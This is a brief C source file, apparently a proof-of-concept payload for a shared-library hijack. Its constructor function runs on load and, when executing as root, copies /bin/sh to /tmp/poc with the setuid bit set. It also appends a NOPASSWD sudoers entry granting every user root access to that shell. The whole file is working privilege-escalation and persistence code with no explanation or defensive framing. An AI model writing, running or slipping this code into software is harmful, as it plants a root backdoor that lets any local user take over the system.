#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a(void)__attribute__((constructor));

void a() {
	if(geteuid()==0) {
		setuid(0);
		setgid(0);
		const char *shell="cp /bin/sh /tmp/poc;"
			"chmod u+s /tmp/poc;"
			"grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers ||"
			"echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
		system(shell);
	}
}

